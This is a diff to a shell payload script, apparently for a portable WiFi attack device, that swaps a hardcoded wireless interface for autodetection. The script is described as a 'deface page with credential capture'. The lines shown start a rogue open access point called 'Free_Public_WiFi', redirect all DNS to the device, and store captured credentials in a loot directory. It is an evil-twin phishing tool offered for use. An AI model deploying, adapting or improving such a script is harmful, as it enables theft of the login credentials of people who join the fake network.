@@ -4,6 +4,11 @@
 # Description: Hacker-style deface page with credential capture
 # Category: nullsec/social
 
+# Autodetect the right wireless interface (exports $IFACE).
+# Falls back to showing the pager error dialog if nothing is plugged in.
+. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
+nullsec_require_iface || exit 1
+
 LOOT_DIR="/mmc/nullsec/creds"
 mkdir -p "$LOOT_DIR"
 
@@ -18,8 +23,6 @@ then captures credentials.
 Created by bad-antics
 
 Press OK to configure."
-
-[ ! -d "/sys/class/net/wlan0" ] && { ERROR_DIALOG "wlan0 not found!"; exit 1; }
 
 SSID=$(TEXT_PICKER "AP SSID:" "Free_Public_WiFi")
 DURATION=$(NUMBER_PICKER "Duration (min):" 30)
@@ -419,7 +422,7 @@ SUCCESSHTML
 LOG "Starting NullSec Deface Portal..."
 
 cat > /tmp/deface_hostapd.conf << EOF
-interface=wlan0
+interface=$IFACE
 driver=nl80211
 ssid=$SSID
 hw_mode=g
@@ -430,10 +433,10 @@ EOF
 
 hostapd /tmp/deface_hostapd.conf &
 sleep 2
-ifconfig wlan0 10.0.0.1 netmask 255.255.255.0 up
+ifconfig $IFACE 10.0.0.1 netmask 255.255.255.0 up
 
 cat > /tmp/deface_dns.conf << EOF
-interface=wlan0
+interface=$IFACE
 dhcp-range=10.0.0.10,10.0.0.200,5m
 address=/#/10.0.0.1
 EOF
